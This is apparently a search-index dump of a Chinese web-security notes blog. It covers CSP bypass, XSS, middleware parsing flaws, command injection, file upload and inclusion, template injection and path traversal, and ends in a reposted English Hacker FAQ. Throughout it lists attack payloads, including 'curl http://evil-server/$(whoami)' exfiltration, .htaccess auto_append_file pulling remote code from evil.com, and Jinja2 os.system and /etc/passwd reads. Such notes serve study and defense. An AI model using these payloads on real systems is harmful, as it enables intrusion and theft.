nonce-&lt;base64-value&gt;&#39; 使用随机的nonce，允许加载标签上nonce属性匹配的标签e.g. script-src &#39;nonce-bm9uY2U=&#39; &lt;hash-algo&gt;-&lt;base64-value&gt;&#39; 允许hash值匹配的代码块被执行e.g. script-src &#39;sha256-&lt;base64-value&gt;&#39; 4.2.4.2.3. 配置范例允许执行内联 JS 代码，但不允许加载外部资源 12Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; Bypass预加载浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。 HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如 123456789&lt;!-- 预加载某个页面 --&gt;&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;&lt;!-- 预加载某个图片 --&gt;&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;&lt;!-- DNS 预解析 --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;&lt;!-- 特定文件类型预加载 --&gt;&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt; 另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作： URL中包含下载资源 页面中包含音频、视频 POST、PUT和DELET操作的ajax请求 HTTP认证 HTTPS页面 含恶意软件的页面 弹窗页面 占用资源很多的页面 打开了chrome developer tools开发工具 MIME sniff举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再&lt;script href=&#39;http://xxx.com/xx.jpg&#39;&gt;，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本 302跳转对于302跳转绕过CSP而言，实际上有以下几点限制： 跳板必须在允许的域内。 要加载的文件的host部分必须跟允许的域的host部分一致 iframe当可以执行代码时，可以创建一个源为 css js 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 ../../../ /%2e%2e%2f 等可能触发服务器报错的链接也可以到达相应的目的。 base-uri当script-src为nonce或无限制，且base-uri无限制时，可通过 base 标签修改根URL来bypass，如下加载了http://evil.com/main.js 12&lt;base href=&quot;http://evil.com/&quot;&gt;&lt;script nonce=&quot;correct value&quot; src=&quot;/main.js&quot;&gt;&lt;/script&gt; 其他 location 绕过 可上传SVG时，通过恶意SVG绕过同源站点 存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析 CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass Angular versions &lt;1.5.9 &gt;&#x3D;1.5.0，存在漏洞 Git Pull Request jQuery sourcemap document.write( //@ sourceMappingURL=http://xxxx/`+document.cookie+`);`` a标签的ping属性 For FireFox &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt; &lt;link rel=&quot;import&quot; /&gt; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt; 仅限制 script-src 时： &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; XSS数据源URL location location.href location.pathname location.search location.hash document.URL document.documentURI document.baseURI Navigation window.name document.referrer Communication Ajax Fetch WebSocket PostMessage Storage Cookie LocalStorage SessionStorage Sink执行JavaScript eval(payload) setTimeout(payload, 100) setInterval(payload, 100) Function(payload)() &lt;script&gt;payload&lt;/script&gt; &lt;img src=x onerror=payload&gt; 加载URL location=javascript:alert(/xss/) location.href=javascript:alert(/xss/) location.assign(javascript:alert(/xss/)) location.replace(javascript:alert(/xss/)) 执行HTML xx.innerHTML=payload xx.outerHTML=payload document.write(payload) document.writeln(payload) xss保护HTML过滤使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。 X-FrameX-Frame-Options 响应头有三个可选的值： DENY 页面不能被嵌入到任何iframe或frame中 SAMEORIGIN 页面只能被本站页面嵌入到iframe或者frame中 ALLOW-FROM 页面允许frame或frame加载 XSS保护头基于 Webkit 内核的浏览器(比如Chrome)在特定版本范围内有一个名为XSS auditor的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。 而浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。 要设置浏览器的防护机制，则可使用X-XSS-Protection字段 该字段有三个可选的值 0 : 表示关闭浏览器的XSS防护机制 1 : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置 1; mode=block : 如果检测到恶意代码，在不渲染恶意代码 FireFox没有相关的保护机制，如果需要保护，可使用NoScript等相关插件。","categories":[],"tags":[]},{"title":"中间件","slug":"中间件","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:47:49.610Z","comments":true,"path":"2023/12/26/中间件/","link":"","permalink":"http://example.com/2023/12/26/%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"[TOC] IISIIS 6.0 后缀解析 /xx.asp;.jpg 服务器默认不解析 ; 号及其后面的内容，相当于截断。 目录解析 /xx.asp/xx.jpg (xx.asp目录下任意解析) 默认解析 xx.asa xx.cer xx.cdx PROPFIND 栈溢出漏洞 RCE CVE-2017-7269 IIS 7.0-7.5 &#x2F; Nginx &lt;&#x3D; 0.8.37在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为php文件。 PUT漏洞 开启WebDAV 拥有来宾用户，且来宾用户拥有上传权限 可任意文件上传 Windows特性Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx.php[空格] ， xx.php.， xx.php/， xx.php::$DATA 上传脚本文件。 文件名猜解在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下： 文件名为原文件名前6位字符加上 ~1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。 后缀名不超过3位，超过部分会被截断 所有小写字母均转换成大写的字母 文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件 IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。 这种方法的局限性在于： 文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报 不支持中文文件名 这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭NTFS 8.3文件格式的支持来修复。 Apache后缀解析test.php.x1.x2.x3 （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析 htaccess当AllowOverride被启用时，上传启用解析规则的.htaccess 123456789101112AddType application/x-httpd-php .jpgphp_value auto_append_file .htaccess#&lt;?php phpinfo();Options ExecCGIAddHandler cgi-script .jpgOptions +ExecCGIAddHandler fcgid-script .gifFcgidWrapper &quot;/bin/bash&quot; .gifphp_flag allow_url_include 1php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B#php_value auto_append_file https://evil.com/evil-code.txt 目录遍历配置 Options +Indexes 时Apache存在目录遍历漏洞。 CVE-2017-15715%0A 绕过上传黑名单。 4.15.2.5. lighttpd1xx.jpg/xx.php NginxFast-CGI关闭在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 %00.php ， 即 xx.jpg%00.php 会被当做 php 文件来解析 Fast-CGI开启在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为php文件 CVE-2013-45471a.jpg\\x20\\x00.php 配置错误目录穿越如果配置中存在类似 location /foo &#123; alias /bar/; &#125; 的配置时，/foo../ 会被解析为 /bar/../ 从而导致目录穿越的发生。 目录遍历配置中 autoindex on 开启时，Nginx中存在目录遍历漏洞。","categories":[],"tags":[]},{"title":"主动打点和被动打点","slug":"主动打点和被动打点","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-25T18:01:59.635Z","comments":true,"path":"2023/12/26/主动打点和被动打点/","link":"","permalink":"http://example.com/2023/12/26/%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9/","excerpt":"","text":"主动打点和被动打点12主动式信息打点：主动使用工具、主动发起测试流量等被动式信息打点：调用接口获取信息等","categories":[],"tags":[]},{"title":"命令注入","slug":"命令注入","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:46:26.660Z","comments":true,"path":"2023/12/26/命令注入/","link":"","permalink":"http://example.com/2023/12/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","excerpt":"","text":"命令注入简介命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。 . 常见危险函数PHP system exec passthru shell_exec popen proc_open Python system popen subprocess.call spawn Java java.lang.Runtime.getRuntime().exec(command) 常见注入方式 分号分割 || &amp;&amp; &amp; 分割 | 管道符 \\r\\n %d0%a0 换行 反引号解析 $() 替换 无回显技巧 bash反弹shell DNS带外数据 http带外 curl http://evil-server/$(whoami)``wget http://evil-server/$(whoami) 无带外时利用 sleep 或其他逻辑构造布尔条件 常见绕过方式空格绕过 &lt; 符号 cat&lt;123 \\t &#x2F; %09 $&#123;IFS&#125; 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串 . 黑名单绕过 a=l;b=s;$a$b base64 echo &quot;bHM=&quot; | base64 -d /?in/?s &#x3D;&gt; /bin/ls 连接符 cat /etc/pass&#39;w&#39;d 未定义的初始化变量 cat$x /etc/passwd 长度限制绕过12345&gt;wget\\&gt;foo.\\&gt;comls -t&gt;ash a 上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls &#x2F;usr&#x2F;bin&#x2F;?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件 常用符号命令分隔符 %0a &#x2F; %0d &#x2F; \\n &#x2F; \\r ; &amp; &#x2F; &amp;&amp; 通配符 * 0到无穷个任意字符 ? 一个任意字符 [ ] 一个在括号内的字符，e.g. [abcd] [ - ] 在编码顺序内的所有字符 [^ ] 一个不在括号内的字符 防御 不使用时禁用相应函数 尽量不要执行外部的应用程序或命令 做输入的格式检查 转义命令中的所有shell元字符 shell元字符包括 #&amp;;,|*?~&lt;&gt;^()[]{}$`","categories":[],"tags":[]},{"title":"文件上传","slug":"文件上传","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:46:59.039Z","comments":true,"path":"2023/12/26/文件上传/","link":"","permalink":"http://example.com/2023/12/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"文件上传文件类型检测绕过更改请求绕过有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了HTTP Header中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。 Magic检测绕过有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示 类型 二进制值 JPG FF D8 FF E0 00 10 4A 46 49 46 GIF 47 49 46 38 39 61 PNG 89 50 4E 47 TIF 49 49 2A 00 BMP 42 4D 后缀绕过部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。 php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php &#x2F; php5 &#x2F; pht &#x2F; phtml &#x2F; shtml &#x2F; pwml &#x2F; phtm 等 可在禁止上传php文件时测试该类型。 jsp引擎则可能会解析 jspx &#x2F; jspf &#x2F; jspa &#x2F; jsw &#x2F; jsv &#x2F; jtml 等后缀，asp支持 asa &#x2F; asax &#x2F; cer &#x2F; cdx &#x2F; aspx &#x2F; ascx &#x2F; ashx &#x2F; asmx &#x2F; asp&#123;80-90&#125; 等后缀。 除了这些绕过，其他的后缀同样可能带来问题，如 vbs &#x2F; asis &#x2F; sh &#x2F; reg &#x2F; cgi &#x2F; exe &#x2F; dll &#x2F; com &#x2F; bat &#x2F; pl &#x2F; cfc &#x2F; cfm &#x2F; ini 等。 系统命名绕过在Windows系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。 也可尝试 index.php%20 ， index.php:1.jpg index.php::$DATA 等。 在Linux系统中，可以尝试上传名为 index.php/. 或 ./aa/../index.php/. 的文件 .user.ini在php执行的过程中，除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 .user.ini 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 .user.ini 加上非php后缀的文件构造一个shell，比如 auto_prepend_file=01.gif 。 WAF绕过有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。 另外，Waf和Web系统对 boundary 的处理不一致，可以使用错误的 boundary 来完成绕过。 竞争上传绕过有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。 攻击技巧Apache重写GetShellApache可根据是否允许重定向考虑上传.htaccess 内容为 12AddType application/x-httpd-php .pngphp_flag engine 1 就可以用png或者其他后缀的文件做php脚本了 软链接任意读文件上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果 防护技巧 使用白名单限制上传文件的类型 使用更严格的文件类型检查方式 限制Web Server对上传文件夹的解析","categories":[],"tags":[]},{"title":"文件包含","slug":"文件包含","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:46:45.410Z","comments":true,"path":"2023/12/26/文件包含/","link":"","permalink":"http://example.com/2023/12/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"文件包含[TOC] 基础常见的文件包含漏洞的形式为 &lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]); ?&gt; 考虑常用的几种包含方式为 同目录包含 file=.htaccess 目录遍历 ?file=../../../../../../../../../var/lib/locate.db 日志注入 ?file=../../../../../../../../../var/log/apache/error.log 利用 /proc/self/environ 其中日志可以使用SSH日志或者Web日志等多种日志来源测试 触发SinkPHP include 在包含过程中出错会报错，不影响执行后续语句 include_once 仅包含一次 require 在包含过程中出错，就会直接退出，不执行后续语句 require_once 绕过技巧常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式 url编码绕过如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过 特殊字符绕过 某些情况下，读文件支持使用Shell通配符，如 ? * 等 url中 使用 ? # 可能会影响include包含的结果 某些情况下，unicode编码不同但是字形相近的字符有同一个效果 %00截断几乎是最常用的方法，条件是 magic_quotes_gpc 关闭，而且php版本小于5.3.4。 长度截断Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。 msdn定义 #define MAX_PATH 260，其中第260个字符为字符串结尾的 \\0 ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。 获取最长文件路径长度：getconf PATH_MAX &#x2F;root 得到4096 获取最长文件名：getconf NAME_MAX &#x2F;root 得到255 那么在长度有限的时候，././././ (n个) 的形式就可以通过这个把路径爆掉 在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8 伪协议绕过 远程包含: 要求 allow_url_fopen=On 且 allow_url_include=On ， payload为 ?file=[http|https|ftp]://websec.wordpress.com/shell.txt 的形式 PHP input: 把payload放在POST参数中作为包含的文件，要求 allow_url_include=On ，payload为 ?file=php://input 的形式 Base64: 使用Base64伪协议读取文件，payload为 ?file=php://filter/convert.base64-encode/resource=index.php 的形式 data: 使用data伪协议读取文件，payload为 ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= 的形式，要求 allow_url_include=On 协议绕过allow_url_fopen 和 allow_url_include 主要是针对 http ftp 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。","categories":[],"tags":[]},{"title":"模板注入","slug":"模板注入","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:46:03.938Z","comments":true,"path":"2023/12/26/模板注入/","link":"","permalink":"http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"模版注入简介模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。 测试方法 确定使用的引擎 查看引擎相关的文档，确定其安全机制以及自带的函数和变量 需找攻击面，尝试攻击 测试用例 简单的数学表达式，&#123;&#123; 7+7 &#125;&#125; =&gt; 14 字符串表达式 &#123;&#123; \"ajin\" &#125;&#125; =&gt; ajin Ruby &lt;%= 7 * 7 %&gt;``&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt; Java $&#123;7*7&#125; Twig &#123;&#123;7*7&#125;&#125; Smarty &#123;php&#125;echo id;&#123;/php&#125; AngularJS $eval(&#39;1+1&#39;) Tornado 引用模块 &#123;% import module %&#125;&#x3D;&gt; &#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125; Flask&#x2F;Jinja2 &#123;&#123; config &#125;&#125;``&#123;&#123; config.items() &#125;&#125;``&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;``&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;``&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;``&#123;&#123; request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() &#125;&#125; Django &#123;&#123; request &#125;&#125;``&#123;% debug %&#125;``&#123;% load module %&#125;``&#123;% include \"x.html\" %&#125;``&#123;% extends \"x.html\" %&#125; 目标 创建对象 文件读写 远程文件包含 信息泄漏 提权 相关属性__class__python中的新式类（即显示继承object对象的类）都有一个属性 __class__ 用于获取当前实例对应的类，例如 &quot;&quot;.__class__ 就可以获取到字符串实例对应的类 __mro__python中类对象的 __mro__ 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。 __globals__保存了函数所有的所有全局变量，在利用中，可以使用 __init__ 获取对象的函数，并通过 __globals__ 获取 file os 等模块以进行下一步的利用 __subclasses__()python的新式类都保留了它所有的子类的引用，__subclasses__() 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。 因为python中的类都是继承object的，所以只要调用object类对象的 __subclasses__() 方法就可以获取想要的类的对象。 绕过技巧字符串拼接1request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60] 使用参数绕过12345678910params = &#123; &#x27;clas&#x27;: &#x27;__class__&#x27;, &#x27;mr&#x27;: &#x27;__mro__&#x27;, &#x27;subc&#x27;: &#x27;__subclasses__&#x27;&#125;data = &#123; &quot;data&quot;: &quot;&#123;&#123;&#x27;&#x27;[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;&#125;r = requests.post(url, params=params, data=data)print(r.text)","categories":[],"tags":[]},{"title":"目录穿越","slug":"目录穿越","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:46:35.019Z","comments":true,"path":"2023/12/26/目录穿越/","link":"","permalink":"http://example.com/2023/12/26/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/","excerpt":"","text":"目录穿越 [TOC] 目录穿越简介目录穿越（也被称为目录遍历&#x2F;directory traversal&#x2F;path traversal）是通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。 攻击载荷URL参数 ../ ..\\ ..;/ Nginx Off by Slash https://vuln.site.com/files../ UNC Bypass \\\\localhost\\c$\\windows\\win.ini 过滤绕过 单次替换 ...// URL编码 16位Unicode编码 \\u002e 超长UTF-8编码 \\%e0%40%ae 防御在进行文件操作相关的API前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。 若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。","categories":[],"tags":[]},{"title":"逻辑漏洞/业务漏洞","slug":"逻辑漏洞","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:47:20.775Z","comments":true,"path":"2023/12/26/逻辑漏洞/","link":"","permalink":"http://example.com/2023/12/26/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"逻辑漏洞 &#x2F; 业务漏洞简介逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。 在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。 安装逻辑 查看能否绕过判定重新安装 查看能否利用安装文件获取信息 看能否利用更新功能获取信息 交易购买 修改支付的价格 修改支付的状态 修改购买数量为负数 修改金额为负数 重放成功的请求 并发数据库锁处理不当 业务风控 刷优惠券 套现 账户注册 覆盖注册 尝试重复用户名 注册遍历猜解已有账号 密码 密码未使用哈希算法保存 没有验证用户设置密码的强度 邮箱用户名 前后空格 大小写变换 Cookie 包含敏感信息 未验证合法性可伪造 手机号用户名 前后空格 +86 登录 撞库 设置异地登录检查等机制 账号劫持 恶意尝试帐号密码锁死账户 需要设置锁定机制与解锁机制 不安全的传输信道 登录凭证存储在不安全的位置 找回密码 重置任意用户密码 密码重置后新密码在返回包中 Token验证逻辑在前端 X-Forwarded-Host处理不正确 找回密码功能泄露用户敏感信息 修改密码 越权修改密码 修改密码没有旧密码验证 申诉 身份伪造 逻辑绕过 更新 ORM更新操作不当可更新任意字段 权限限制不当可以越权修改 信息查询 权限限制不当可以越权查询 用户信息ID可以猜测导致遍历 2FA 重置密码后自动登录没有2FA OAuth登录没有启用2FA 2FA可爆破 2FA有条件竞争 修改返回值绕过 激活链接没有启用2FA 可通过CSRF禁用2FA 验证码 验证码可重用 验证码可预测 验证码强度不够 验证码无时间限制或者失效时间长 验证码无猜测次数限制 验证码传递特殊的参数或不传递参数绕过 验证码可从返回包中直接获取 验证码不刷新或无效 验证码数量有限 验证码在数据包中返回 修改Cookie绕过 修改返回包绕过 验证码在客户端生成或校验 验证码可OCR或使用机器学习识别 验证码用于手机短信&#x2F;邮箱轰炸 Session Session机制 Session猜测 &#x2F; 爆破 Session伪造 Session泄漏 Session Fixation 越权 未授权访问 静态文件通过特定url来防止被访问 水平越权 攻击者可以访问与他拥有相同权限的用户的资源权限类型不变，ID改变 垂直越权 低级别攻击者可以访问高级别用户的资源权限ID不变，类型改变 交叉越权 权限ID改变，类型改变 随机数安全 使用不安全的随机数发生器 使用时间等易猜解的因素作为随机数种子 其他 用户&#x2F;订单&#x2F;优惠券等ID生成有规律，可枚举 接口无权限、次数限制 加密算法实现误用 执行顺序 敏感信息泄露","categories":[],"tags":[]},{"title":"配置与安全","slug":"配置与策略安全","date":"2023-12-25T18:01:50.000Z","updated":"2023-12-27T13:47:31.949Z","comments":true,"path":"2023/12/26/配置与策略安全/","link":"","permalink":"http://example.com/2023/12/26/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/","excerpt":"","text":"配置与策略安全认证策略密码策略 未限制密码最低位数 未限制密码必须包含字符集 为常用密码 个人信息相关 手机号生日姓名用户名 未检测常见弱密码 已泄露的常用密码键盘模式 加密实现 在客户端存储私钥 权限配置 运维人员权限粒度过大 客服人员权限粒度过大 供应链安全三方认证 利用被攻击的第三方服务账号登录其他平台账号 三方库&#x2F;软件 公开漏洞后没有及时更新","categories":[],"tags":[]},{"title":"判断数据库","slug":"判断数据库","date":"2023-12-25T18:01:02.000Z","updated":"2023-12-25T18:01:16.263Z","comments":true,"path":"2023/12/26/判断数据库/","link":"","permalink":"http://example.com/2023/12/26/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"数据库判定​ 端口扫描 1234567mysql 3306oracle 1521sql server 1433db2 5000","categories":[],"tags":[]},{"title":"判断操作系统","slug":"判断操作系统","date":"2023-12-25T17:59:56.000Z","updated":"2023-12-25T18:01:04.608Z","comments":true,"path":"2023/12/26/判断操作系统/","link":"","permalink":"http://example.com/2023/12/26/%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"判断操作系统ttl123456WINDOWS NT/2000 TTL：128WINDOWS 95/98 TTL：32UNIX TTL：255LINUX TTL：64WIN7 TTL：64 nmap使用技术可以具体了解判定方法","categories":[],"tags":[]},{"title":"加解密","slug":"加解密","date":"2023-12-25T17:57:41.000Z","updated":"2023-12-27T15:47:57.874Z","comments":true,"path":"2023/12/26/加解密/","link":"","permalink":"http://example.com/2023/12/26/%E5%8A%A0%E8%A7%A3%E5%AF%86/","excerpt":"","text":"加解密123456789101112131415161718192021md5 16位和32位 0-9 和a-f 组成的字符串 解密： 1.知道算法 2.碰撞枚举生成密文 有特殊情况。md5会加salt一个字符串。 discuzSHA1和md5特征差不多，只是位数是40NTLMWINDOWS系统哈希密码，标准通讯安全协议win7之后使用的密码之前是LMaes，des，rc4都是非对称加密。印度密钥，密文特质与base64类似 大小写敏感 123456base64 通常以=结尾、1-9 a-furl 通常以=结尾、1-9 a-f 通常以%数字字母分割 编码gbk，utf-8 颜文字加密：aaencode12jother： +()[]&#123;&#125;jsfuck是和jother很像。少了&#123;&#125; 图片里包含文件的技术","categories":[],"tags":[]},{"title":"【转载】hacker","slug":"【转载】hacker","date":"2023-12-24T07:30:16.000Z","updated":"2023-12-24T17:37:53.437Z","comments":true,"path":"2023/12/24/【转载】hacker/","link":"","permalink":"http://example.com/2023/12/24/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91hacker/","excerpt":"NEWS!A version of this has been bought by IBM DeveloperWorks.","text":"NEWS!A version of this has been bought by IBM DeveloperWorks. Furthermore, IBM sponsored another article, the Manager FAQ, a guide to managers for hackers who are frustrated and confused by corporate life. I’d like to thank IBM for their kind support of this project. I’m pretty happy with the new piece, and I’m glad to have finally been nudged into posting it. I’d like to point out how reasonable and friendly IBM has been about this; compare with the way that CRC has treated Eric Weisstein. I have a Powell’s “bookshelf”, which is sort of a list of recommended books; some are fairly relevant to this page. Look! Books! The Hacker FAQThe following list is an attempt to cover some of the issues that will invariably come up when people without previous experience of the hacker community try to hire a hacker. This FAQ is intended for free distribution, and may be copied as desired. It is in an early revision. If you wish to modify the FAQ, or distribute it for publication, please contact the author. The author is &#115;&#101;&#x65;&#98;&#x73;&#64;&#112;&#x6c;&#x65;&#116;&#104;&#111;&#x72;&#x61;&#x2e;&#x6e;&#101;&#116;. The official distribution site (as of revision 0.05) is “http://www.plethora.net/~seebs/faqs/hacker.html“. DISCLAIMER: The author is a hacker. Bias is inevitable. This document is copyright 1995, 1996, 1998, 1999 Peter Seebach. Unaltered distribution is permitted. Revision 0.05 - Last modified September 28, 1999 Questions and Answers:Section 0: Basic understanding.0.0: Won’t my hacker break into my computer and steal my trade secrets?No. Hackers aren’t, contrary to media reporting, the people who break into computers. Those are crackers. Hackers are people who enjoy playing with computers. Your hacker may occasionally circumvent security measures, but this is not malicious; she just does it when the security is in her way, or because she’s curious.0.1: Was it a good idea to hire a hacker?It depends on the job. A hacker can be dramatically more effective than a non-hacker at a job, or dramatically less effective. Jobs where hackers are particularly good are:Systems administrationProgrammingDesignJobs where hackers are particularly bad are: Data entryMore generally, a job that requires fast and unexpected changes, significant skill, and is not very repetitive will be one a hacker will excel at. Repetitive, simple jobs are a waste of a good hacker, and will make your hacker bored and frustrated. No one works well bored and frustrated. The good news is, if you get a hacker on something he particularly likes, you will frequently see performance on the order of five to ten times what a “normal” worker would produce. This is not consistent, and you shouldn’t expect to see it all the time, but it will happen. This is most visible on particularly difficult tasks. 0.2: How should I manage my hacker?The same way you herd cats. It can be a 